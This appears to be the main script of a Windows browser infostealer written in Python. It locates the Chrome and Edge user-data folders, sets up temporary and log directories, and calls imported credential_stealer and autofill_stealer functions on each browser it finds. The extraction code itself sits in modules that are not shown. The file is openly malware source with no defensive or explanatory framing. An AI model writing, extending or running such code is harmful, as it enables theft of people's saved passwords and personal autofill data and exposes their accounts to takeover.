# Add arg parser
import os
from credentials import credential_stealer
from autofill import autofill_stealer
from util import TEMP_PATH, LOGS_PATH

browsers = [
    {
        'name': 'Chrome',
        'path': os.getenv('localappdata') + r'\Google\Chrome\User Data',
    },
    {
        'name': 'Edge',
        'path': os.getenv('localappdata') + r'\Microsoft\Edge\User Data',
    },
]


# Create temp directory for sql database copies
if not os.path.exists(TEMP_PATH):
    os.mkdir(TEMP_PATH)
# Create logs directory for extracted data
if not os.path.exists(LOGS_PATH):
    os.mkdir(LOGS_PATH)

for browser in browsers:
    # Extract from installed Chromium browsers
    if os.path.exists(browser['path']):
        credential_stealer(browser)
        autofill_stealer(browser)
